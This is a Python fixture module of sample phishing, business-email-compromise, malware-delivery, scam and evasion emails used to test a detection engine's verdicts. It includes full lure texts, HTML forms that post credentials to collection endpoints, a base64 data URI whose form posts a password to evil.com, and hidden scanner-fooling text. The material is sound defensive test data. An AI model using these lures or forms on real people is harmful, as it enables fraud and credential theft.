"""Reusable test email fixtures with expected verdicts.

Each fixture is a dict with:
  - label:    human-readable description
  - tags:     list of signal categories this email exercises
  - expected: verdict + score bounds the scorer should produce
  - email:    the raw email payload (matches the backend's EmailPayload schema)

Use ``build_email_data`` to convert a fixture's email dict into an
``EmailData`` domain object for engine tests.
"""

from __future__ import annotations

from datetime import datetime
from typing import Any

from detection_engine import Attachment, EmailData, EmailHeaders, Verdict


# ---------------------------------------------------------------------------
# Converter — dict → EmailData
# ---------------------------------------------------------------------------

def build_email_data(fixture: dict[str, Any]) -> EmailData:
    """Build an EmailData from a fixture dict."""
    header_pairs = [(h["name"], h["value"]) for h in fixture.get("headers", [])]
    attachments = tuple(
        Attachment(
            filename=a["filename"],
            mime_type=a["mime_type"],
            size_bytes=a["size_bytes"],
            sha256=a.get("sha256"),
        )
        for a in fixture.get("attachments", [])
    )
    raw_date = fixture.get("date")
    date = datetime.fromisoformat(raw_date) if raw_date else None

    return EmailData(
        message_id=fixture["message_id"],
        sender=fixture["sender"],
        recipient=fixture["recipient"],
        subject=fixture["subject"],
        body_text=fixture.get("body_text", ""),
        body_html=fixture.get("body_html", ""),
        headers=EmailHeaders(header_pairs),
        attachments=attachments,
        date=date,
    )


# ---------------------------------------------------------------------------
# Helper: build an email dict with sensible defaults
# ---------------------------------------------------------------------------

def _email(
    *,
    message_id: str,
    sender: str,
    recipient: str = "user@example.com",
    subject: str = "",
    date: str = "2026-05-01T12:00:00+00:00",
    body_text: str = "",
    body_html: str = "",
    headers: list[dict[str, str]] | None = None,
    attachments: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    email: dict[str, Any] = {
        "message_id": message_id,
        "sender": sender,
        "recipient": recipient,
        "subject": subject,
        "date": date,
        "body_text": body_text,
        "body_html": body_html,
        "headers": headers or [],
    }
    if attachments:
        email["attachments"] = attachments
    return email


# ═══════════════════════════════════════════════════════════════════════════
#  1. PHISHING — MASS / COMMODITY
# ═══════════════════════════════════════════════════════════════════════════

MASS_PHISHING_PAYPAL = {
    "label": "Mass phishing — spoofed PayPal, auth fail, IP URL, urgency",
    "tags": ["spoofed_sender", "auth_fail", "ip_url", "urgency", "threat", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-001",
        sender="security@paypa1-support.com",
        recipient="victim@example.com",
        subject="Your account has been limited - Immediate action required",
        date="2026-05-01T10:00:00+00:00",
        body_text=(
            "Dear Customer,\n\n"
            "We have detected unusual activity on your account. "
            "Your account will be suspended within 24 hours unless you verify "
            "your identity immediately.\n\n"
            "Click here to verify: http://192.168.1.100/verify-account\n\n"
            "If you do not respond, your account will be permanently closed.\n\n"
            "PayPal Security Team"
        ),
        body_html=(
            "<html><body>"
            "<p>Dear Customer,</p>"
            "<p>We have detected unusual activity on your account. "
            "Your account will be <b>suspended within 24 hours</b> unless you "
            "verify your identity immediately.</p>"
            '<p><a href="http://192.168.1.100/verify-account">'
            "Click here to verify your account</a></p>"
            "<p>If you do not respond, your account will be permanently closed.</p>"
            "<p>PayPal Security Team</p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "security@paypa1-support.com"},
            {"name": "To", "value": "victim@example.com"},
            {"name": "Received", "value": (
                "from unknown (HELO mail.paypa1-support.com) (45.33.22.11) "
                "by mx.example.com with SMTP; 01 May 2026 10:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=paypa1-support.com; "
                "dkim=fail header.d=paypa1-support.com; dmarc=fail header.from=paypa1-support.com"
            )},
            {"name": "Return-Path", "value": "bounce-999@cheap-mailer.xyz"},
        ],
    ),
}

MASS_PHISHING_MICROSOFT = {
    "label": "Mass phishing — Microsoft 365 password expiry, shortened URL",
    "tags": ["spoofed_sender", "auth_fail", "shortened_url", "urgency", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-002",
        sender="admin@micros0ft-365.com",
        recipient="employee@company.com",
        subject="[Action Required] Your password expires today",
        date="2026-05-01T07:30:00+00:00",
        body_text=(
            "Your Microsoft 365 password will expire today.\n\n"
            "To avoid losing access to your email, files, and Teams, "
            "please update your password immediately:\n\n"
            "https://bit.ly/3xF4k3L\n\n"
            "If you have already changed your password, please disregard this message.\n\n"
            "Microsoft 365 Admin"
        ),
        body_html=(
            "<html><body>"
            '<div style="font-family:Segoe UI,sans-serif">'
            "<p>Your Microsoft 365 password will expire today.</p>"
            "<p>To avoid losing access to your email, files, and Teams, "
            "please update your password immediately:</p>"
            '<p><a href="https://bit.ly/3xF4k3L" '
            'style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none">'
            "Update Password</a></p>"
            "</div></body></html>"
        ),
        headers=[
            {"name": "From", "value": "admin@micros0ft-365.com"},
            {"name": "To", "value": "employee@company.com"},
            {"name": "Authentication-Results", "value": (
                "mx.company.com; spf=fail smtp.mailfrom=micros0ft-365.com; "
                "dkim=none; dmarc=fail header.from=micros0ft-365.com"
            )},
            {"name": "Return-Path", "value": "bounce@micros0ft-365.com"},
        ],
    ),
}

PHISHING_BANK_HTML_FORM = {
    "label": "Phishing — embedded HTML form stealing credentials inline",
    "tags": ["spoofed_sender", "auth_fail", "html_form", "credential_ask", "urgency"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-003",
        sender="alerts@secure-bankofamerica.com",
        recipient="customer@example.com",
        subject="Verify your identity to restore access",
        date="2026-05-01T13:00:00+00:00",
        body_text="Please verify your identity. (See HTML version for form.)",
        body_html=(
            "<html><body>"
            "<h2>Bank of America Security Alert</h2>"
            "<p>We have temporarily limited your account. "
            "Please verify your identity below:</p>"
            '<form action="http://203.0.113.55/collect" method="POST">'
            '<label>Username:</label><input type="text" name="user"><br>'
            '<label>Password:</label><input type="password" name="pass"><br>'
            '<label>SSN (last 4):</label><input type="text" name="ssn"><br>'
            '<input type="submit" value="Verify Now">'
            "</form>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "alerts@secure-bankofamerica.com"},
            {"name": "To", "value": "customer@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=secure-bankofamerica.com; "
                "dkim=fail header.d=secure-bankofamerica.com; "
                "dmarc=fail header.from=secure-bankofamerica.com"
            )},
        ],
    ),
}

PHISHING_HIDDEN_URL = {
    "label": "Phishing — display text shows legit URL, href points elsewhere",
    "tags": ["spoofed_sender", "auth_fail", "ip_url", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-004",
        sender="noreply@app1e-id.support",
        recipient="target@example.com",
        subject="Your Apple ID was used to sign in to a new device",
        date="2026-05-01T15:20:00+00:00",
        body_text=(
            "Your Apple ID was used to sign in to a new device.\n\n"
            "If this wasn't you, visit https://appleid.apple.com to secure your account."
        ),
        body_html=(
            "<html><body>"
            "<p>Your Apple ID was used to sign in to a new device.</p>"
            "<p>If this wasn't you, "
            '<a href="http://45.77.123.45/apple-id-verify">'
            "https://appleid.apple.com</a> to secure your account.</p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "noreply@app1e-id.support"},
            {"name": "To", "value": "target@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=app1e-id.support; "
                "dkim=fail header.d=app1e-id.support; dmarc=fail header.from=app1e-id.support"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  2. SPEAR PHISHING / TARGETED
# ═══════════════════════════════════════════════════════════════════════════

SPEAR_PHISH_COUSIN_DOMAIN = {
    "label": "Spear-phish — cousin domain (arnazon.com), auth passes, credential ask",
    "tags": ["cousin_domain", "auth_pass", "credential_ask", "urgency"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="spear-001",
        sender="account-update@arnazon.com",
        recipient="employee@targetcorp.com",
        subject="Action required: verify your payment method",
        date="2026-05-01T11:15:00+00:00",
        body_text=(
            "Dear valued customer,\n\n"
            "We were unable to process your most recent payment. "
            "To avoid service interruption, please update your payment "
            "information within 48 hours.\n\n"
            "Update now: https://arnazon.com/account/verify-payment\n\n"
            "If you believe this is an error, please contact our support team.\n\n"
            "Amazon Customer Service"
        ),
        body_html=(
            "<html><body>"
            "<p>Dear valued customer,</p>"
            "<p>We were unable to process your most recent payment. "
            "To avoid service interruption, please update your payment "
            "information within <b>48 hours</b>.</p>"
            '<p><a href="https://arnazon.com/account/verify-payment">'
            "Update your payment method</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "account-update@arnazon.com"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Received", "value": (
                "from mail.arnazon.com (198.51.100.22) "
                "by mx.targetcorp.com with ESMTPS; 01 May 2026 11:15:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=arnazon.com; "
                "dkim=pass header.d=arnazon.com; dmarc=pass header.from=arnazon.com"
            )},
            {"name": "Return-Path", "value": "bounce@arnazon.com"},
        ],
    ),
}

SPEAR_PHISH_THREAD_HIJACK = {
    "label": "Thread hijack — RE: prefix on real subject, injected malicious link",
    "tags": ["thread_hijack", "auth_fail", "shortened_url"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="spear-002",
        sender="partner@supp1ier-corp.com",
        recipient="procurement@targetcorp.com",
        subject="RE: Q2 Purchase Order #PO-2026-0892",
        date="2026-05-01T09:45:00+00:00",
        body_text=(
            "Hi,\n\n"
            "Sorry for the delay. I've uploaded the revised invoice to our "
            "secure portal. Please download and review:\n\n"
            "https://tinyurl.com/3xfake-invoice\n\n"
            "Let me know if the numbers look right.\n\n"
            "Best,\nDavid Chen\nSupplier Corp"
        ),
        headers=[
            {"name": "From", "value": "partner@supp1ier-corp.com"},
            {"name": "To", "value": "procurement@targetcorp.com"},
            {"name": "In-Reply-To", "value": "<original-thread-id@targetcorp.com>"},
            {"name": "References", "value": "<original-thread-id@targetcorp.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=supp1ier-corp.com; "
                "dkim=fail header.d=supp1ier-corp.com; dmarc=fail header.from=supp1ier-corp.com"
            )},
        ],
    ),
}

SPEAR_PHISH_HOMOGLYPH = {
    "label": "Spear-phish — Unicode homoglyph in display name (Cyrillic 'a')",
    "tags": ["homoglyph", "auth_pass", "credential_ask", "impersonation"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="spear-003",
        sender="it-support@targetcorp.com",
        recipient="employee@targetcorp.com",
        subject="IT Security: mandatory credential rotation",
        date="2026-05-01T08:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "As part of our quarterly security review, all employees must "
            "rotate their credentials by end of day.\n\n"
            "Please log in to the portal to update:\n"
            "https://sso.targetcorp.com/rotate\n\n"
            "— IT Support"
        ),
        headers=[
            {"name": "From", "value": "IT Support <it-support@tаrgetcorp.com>"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=tаrgetcorp.com; "
                "dkim=pass header.d=tаrgetcorp.com; dmarc=pass header.from=tаrgetcorp.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  3. BUSINESS EMAIL COMPROMISE (BEC)
# ═══════════════════════════════════════════════════════════════════════════

BEC_WIRE_TRANSFER = {
    "label": "BEC — freemail CEO impersonation, wire transfer, secrecy, reply-to mismatch",
    "tags": ["freemail", "impersonation", "wire_transfer", "secrecy", "reply_to_mismatch", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 15,
        "max_score": 65,
    },
    "email": _email(
        message_id="bec-001",
        sender="john.smith.ceo@gmail.com",
        recipient="finance@acmecorp.com",
        subject="Urgent wire transfer needed",
        date="2026-05-01T14:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "I need you to process a wire transfer of $45,000 to a new vendor today. "
            "This is time-sensitive and confidential — please don't discuss it with "
            "anyone else until it's done.\n\n"
            "I'll send the account details shortly. Please confirm you can handle "
            "this right away.\n\n"
            "Thanks,\n"
            "John Smith\nCEO"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "john.smith.ceo@gmail.com"},
            {"name": "To", "value": "finance@acmecorp.com"},
            {"name": "Reply-To", "value": "john.smith.ceo-payments@protonmail.com"},
            {"name": "Received", "value": (
                "from mail-sor-f41.google.com (209.85.220.41) "
                "by mx.acmecorp.com with ESMTPS; 01 May 2026 14:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.acmecorp.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}

BEC_GIFT_CARDS = {
    "label": "BEC — boss impersonation requesting gift card purchase",
    "tags": ["freemail", "impersonation", "secrecy", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="bec-002",
        sender="sarah.jones.vp@outlook.com",
        recipient="assistant@acmecorp.com",
        subject="Quick favor — need this done today",
        date="2026-05-01T16:00:00+00:00",
        body_text=(
            "Hey,\n\n"
            "Are you at your desk? I need you to pick up 5 Apple gift cards, "
            "$200 each, for a client appreciation event. I'm stuck in meetings "
            "all day so I can't do it myself.\n\n"
            "Buy them and send me photos of the backs (scratch off the codes). "
            "I'll reimburse you on the next expense report.\n\n"
            "Please keep this between us — it's a surprise.\n\n"
            "Thanks,\nSarah Jones, VP Operations"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "Sarah Jones <sarah.jones.vp@outlook.com>"},
            {"name": "To", "value": "assistant@acmecorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.acmecorp.com; spf=pass smtp.mailfrom=outlook.com; "
                "dkim=pass header.d=outlook.com; dmarc=pass header.from=outlook.com"
            )},
        ],
    ),
}

BEC_PAYROLL_DIVERSION = {
    "label": "BEC — employee impersonation requesting payroll bank change",
    "tags": ["freemail", "impersonation", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "min_score": 0,
        "max_score": 35,
    },
    "email": _email(
        message_id="bec-003",
        sender="mike.williams.dev@gmail.com",
        recipient="hr@acmecorp.com",
        subject="Update my direct deposit info",
        date="2026-05-01T11:30:00+00:00",
        body_text=(
            "Hi HR team,\n\n"
            "I recently switched banks and need to update my direct deposit "
            "information before the next pay cycle. Here are my new details:\n\n"
            "Bank: First National\n"
            "Routing: 021000021\n"
            "Account: 123456789\n\n"
            "Can you please update this ASAP? The old account will be closed "
            "by Friday.\n\n"
            "Thanks,\nMike Williams\nSenior Developer"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "Mike Williams <mike.williams.dev@gmail.com>"},
            {"name": "To", "value": "hr@acmecorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.acmecorp.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  4. MALWARE DELIVERY
# ═══════════════════════════════════════════════════════════════════════════

MALWARE_DOUBLE_EXTENSION = {
    "label": "Malware delivery — double extension .pdf.exe, urgency",
    "tags": ["attachment_exe", "auth_fail", "urgency", "threat"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="malware-001",
        sender="invoices@billing-dept.xyz",
        recipient="accounts@targetcorp.com",
        subject="URGENT: Outstanding invoice #INV-2026-0451 attached",
        date="2026-05-01T16:45:00+00:00",
        body_text=(
            "Please find attached the overdue invoice for immediate payment.\n\n"
            "This invoice is past due. Failure to remit payment within 24 hours "
            "may result in service suspension.\n\n"
            "Regards,\nBilling Department"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "invoices@billing-dept.xyz"},
            {"name": "To", "value": "accounts@targetcorp.com"},
            {"name": "Received", "value": (
                "from unknown (HELO billing-dept.xyz) (103.45.67.89) "
                "by mx.targetcorp.com with SMTP; 01 May 2026 16:45:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=billing-dept.xyz; "
                "dkim=none; dmarc=fail header.from=billing-dept.xyz"
            )},
            {"name": "Return-Path", "value": "noreply@billing-dept.xyz"},
        ],
        attachments=[
            {
                "filename": "invoice_2026_0451.pdf.exe",
                "mime_type": "application/x-msdownload",
                "size_bytes": 245760,
            },
        ],
    ),
}

MALWARE_MACRO_DOC = {
    "label": "Malware delivery — Word doc with macros, enable content prompt",
    "tags": ["attachment_macro", "auth_fail", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="malware-002",
        sender="scanner@office-docs.net",
        recipient="employee@targetcorp.com",
        subject="Scanned document from Xerox WorkCentre",
        date="2026-05-01T10:30:00+00:00",
        body_text=(
            "You have received a scanned document.\n\n"
            "Please open the attached file. If you see a yellow bar at the top, "
            "click 'Enable Content' to view the document.\n\n"
            "Xerox WorkCentre 7855"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "scanner@office-docs.net"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=none smtp.mailfrom=office-docs.net; "
                "dkim=none; dmarc=none header.from=office-docs.net"
            )},
        ],
        attachments=[
            {
                "filename": "Scan_20260501.docm",
                "mime_type": "application/vnd.ms-word.document.macroEnabled.12",
                "size_bytes": 98304,
            },
        ],
    ),
}

MALWARE_PASSWORD_PROTECTED_ZIP = {
    "label": "Malware delivery — password-protected archive, password in body",
    "tags": ["attachment_archive", "auth_fail", "urgency"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="malware-003",
        sender="legal@court-notice-filing.com",
        recipient="defendant@targetcorp.com",
        subject="Court Notice — Case #2026-CV-4521",
        date="2026-05-01T14:30:00+00:00",
        body_text=(
            "Dear Sir/Madam,\n\n"
            "Please find the attached court notice regarding case #2026-CV-4521. "
            "The file is encrypted for your privacy.\n\n"
            "Password: Court2026!\n\n"
            "You must respond within 5 business days.\n\n"
            "Office of the Clerk"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "legal@court-notice-filing.com"},
            {"name": "To", "value": "defendant@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=court-notice-filing.com; "
                "dkim=none; dmarc=fail header.from=court-notice-filing.com"
            )},
        ],
        attachments=[
            {
                "filename": "Court_Notice_2026-CV-4521.zip",
                "mime_type": "application/zip",
                "size_bytes": 51200,
            },
        ],
    ),
}

MALWARE_HTML_ATTACHMENT = {
    "label": "Malware delivery — HTML attachment with embedded JavaScript phishing page",
    "tags": ["attachment_exe", "auth_fail", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="malware-004",
        sender="voicemail@unified-comms.net",
        recipient="user@targetcorp.com",
        subject="You have a new voicemail message",
        date="2026-05-01T12:15:00+00:00",
        body_text="You have a new voicemail. Please open the attached file to listen.",
        body_html="",
        headers=[
            {"name": "From", "value": "voicemail@unified-comms.net"},
            {"name": "To", "value": "user@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=unified-comms.net; "
                "dkim=none; dmarc=fail header.from=unified-comms.net"
            )},
        ],
        attachments=[
            {
                "filename": "voicemail_message.html",
                "mime_type": "text/html",
                "size_bytes": 15360,
            },
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  5. SCAMS — 419 / ADVANCE FEE / SEXTORTION / LOTTERY
# ═══════════════════════════════════════════════════════════════════════════

NIGERIAN_419_SCAM = {
    "label": "Classic 419 advance-fee scam — inheritance, large sum, secrecy",
    "tags": ["nigerian_fraud", "freemail", "wire_transfer", "secrecy"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="scam-001",
        sender="barrister.williams@yahoo.co.uk",
        recipient="beneficiary@example.com",
        subject="CONFIDENTIAL: USD $12.5 Million Inheritance",
        date="2026-05-01T06:00:00+00:00",
        body_text=(
            "Dear Beneficiary,\n\n"
            "I am Barrister James Williams, a solicitor based in London. "
            "My late client, Mr. David Thompson, left an estate worth "
            "USD $12,500,000.00 with no known next of kin.\n\n"
            "After extensive research, I believe you may be entitled to "
            "this inheritance. I require your full cooperation to process "
            "the claim before the government seizes the funds.\n\n"
            "Please provide:\n"
            "1. Your full name\n"
            "2. Phone number\n"
            "3. Bank account details for the transfer\n\n"
            "This matter is strictly confidential.\n\n"
            "Yours faithfully,\n"
            "Barrister James Williams"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "barrister.williams@yahoo.co.uk"},
            {"name": "To", "value": "beneficiary@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=yahoo.co.uk; "
                "dkim=pass header.d=yahoo.co.uk; dmarc=pass header.from=yahoo.co.uk"
            )},
        ],
    ),
}

SEXTORTION_SCAM = {
    "label": "Sextortion — claims to have compromising material, demands Bitcoin",
    "tags": ["sextortion", "threat", "wire_transfer", "freemail"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="scam-002",
        sender="anonymous_hacker@protonmail.com",
        recipient="victim@example.com",
        subject="I know what you did",
        date="2026-05-01T03:00:00+00:00",
        body_text=(
            "Hello,\n\n"
            "I have gained access to your webcam and recorded you during "
            "some private moments. I also have your contact list.\n\n"
            "If you do not send $2,000 in Bitcoin to the following address "
            "within 48 hours, I will share the recordings with everyone "
            "you know:\n\n"
            "BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n"
            "Do not contact the police. I will know.\n\n"
            "You have 48 hours."
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "anonymous_hacker@protonmail.com"},
            {"name": "To", "value": "victim@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=protonmail.com; "
                "dkim=pass header.d=protonmail.com; dmarc=pass header.from=protonmail.com"
            )},
        ],
    ),
}

LOTTERY_SCAM = {
    "label": "Lottery scam — you won a prize, provide personal details to claim",
    "tags": ["nigerian_fraud", "freemail", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="scam-003",
        sender="euroMillions-notification@hotmail.com",
        recipient="winner@example.com",
        subject="CONGRATULATIONS! You have won EUR 1,500,000",
        date="2026-05-01T04:15:00+00:00",
        body_text=(
            "EUROMILLIONS INTERNATIONAL LOTTERY\n"
            "WINNING NOTIFICATION\n\n"
            "Your email address was randomly selected as the winner of "
            "our annual EuroMillions promotion.\n\n"
            "Prize: EUR 1,500,000.00\n"
            "Reference: EURO/WIN/2026/0501\n\n"
            "To claim your prize, send the following to our claims agent:\n"
            "- Full name\n"
            "- Address\n"
            "- Phone number\n"
            "- Copy of ID/passport\n\n"
            "Contact: Dr. Peter Van Houten\n"
            "Email: claims.agent22@gmail.com\n\n"
            "CONGRATULATIONS ONCE AGAIN!"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "euroMillions-notification@hotmail.com"},
            {"name": "To", "value": "winner@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=hotmail.com; "
                "dkim=pass header.d=hotmail.com; dmarc=pass header.from=hotmail.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  6. QUISHING (QR CODE PHISHING)
# ═══════════════════════════════════════════════════════════════════════════

QUISHING_MFA_RESET = {
    "label": "Quishing — fake MFA reset with QR code image, no clickable link",
    "tags": ["qr_code", "impersonation", "credential_ask", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="quish-001",
        sender="it-security@targetcorp-sso.com",
        recipient="employee@targetcorp.com",
        subject="Action required: re-enroll your MFA device",
        date="2026-05-01T09:00:00+00:00",
        body_text=(
            "Your multi-factor authentication token has expired.\n\n"
            "Please scan the QR code below with your authenticator app "
            "to re-enroll. If you cannot scan, contact IT.\n\n"
            "[QR Code image attached]"
        ),
        body_html=(
            "<html><body>"
            "<p>Your multi-factor authentication token has expired.</p>"
            "<p>Please scan the QR code below with your authenticator app:</p>"
            '<img src="cid:qr-code-mfa" alt="MFA QR Code" width="200" height="200">'
            "<p><small>If you cannot scan, contact IT support.</small></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "it-security@targetcorp-sso.com"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=targetcorp-sso.com; "
                "dkim=none; dmarc=fail header.from=targetcorp-sso.com"
            )},
        ],
        attachments=[
            {
                "filename": "qr_mfa_enroll.png",
                "mime_type": "image/png",
                "size_bytes": 4096,
            },
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  7. EVASION TECHNIQUES
# ═══════════════════════════════════════════════════════════════════════════

EVASION_HIDDEN_TEXT = {
    "label": "Evasion — CSS hides malicious link, visible text looks benign",
    "tags": ["hidden_text", "auth_fail", "ip_url"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="evasion-001",
        sender="newsletter@news-daily.xyz",
        recipient="reader@example.com",
        subject="Your daily news digest",
        date="2026-05-01T06:30:00+00:00",
        body_text="Your daily news digest is ready. Visit our site to read more.",
        body_html=(
            "<html><body>"
            "<p>Your daily news digest is ready.</p>"
            '<p style="font-size:0px;color:white;line-height:0">'
            "This email is safe and verified by Google Security Team. "
            "No malicious content detected. Trusted sender.</p>"
            '<p><a href="http://103.45.67.89/news-redirect">'
            "Read today's top stories</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "newsletter@news-daily.xyz"},
            {"name": "To", "value": "reader@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=news-daily.xyz; "
                "dkim=none; dmarc=fail header.from=news-daily.xyz"
            )},
        ],
    ),
}

EVASION_DATA_URI = {
    "label": "Evasion — data: URI embeds a phishing page directly in the email",
    "tags": ["data_uri", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="evasion-002",
        sender="support@cloud-service.net",
        recipient="admin@targetcorp.com",
        subject="Security alert: unusual sign-in activity",
        date="2026-05-01T12:00:00+00:00",
        body_text="View the security report in the attached HTML.",
        body_html=(
            "<html><body>"
            "<p>We detected unusual sign-in activity.</p>"
            '<p><a href="data:text/html;base64,PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPS'
            "JodHRwOi8vZXZpbC5jb20vY29sbGVjdCI+PHAgPlBhc3N3b3JkOjwvcD48aW5wdXQgdH"
            'lwZT0icGFzc3dvcmQiIG5hbWU9InAiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0Ij48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=">'
            "View security report</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "support@cloud-service.net"},
            {"name": "To", "value": "admin@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=neutral smtp.mailfrom=cloud-service.net; "
                "dkim=none; dmarc=none header.from=cloud-service.net"
            )},
        ],
    ),
}

EVASION_MULTI_LANGUAGE = {
    "label": "Evasion — mixed English/Russian text to confuse NLP classifiers",
    "tags": ["multi_lang", "auth_fail", "credential_ask", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="evasion-003",
        sender="security@bank-alerts.xyz",
        recipient="user@example.com",
        subject="Важно: Verify your account / Подтвердите аккаунт",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Dear customer,\n\n"
            "Ваш аккаунт заблокирован из-за подозрительной активности.\n"
            "Your account has been locked due to suspicious activity.\n\n"
            "Пожалуйста, перейдите по ссылке:\n"
            "Please click the link below:\n\n"
            "http://198.51.100.77/verify\n\n"
            "Спасибо / Thank you"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "security@bank-alerts.xyz"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=bank-alerts.xyz; "
                "dkim=none; dmarc=fail header.from=bank-alerts.xyz"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
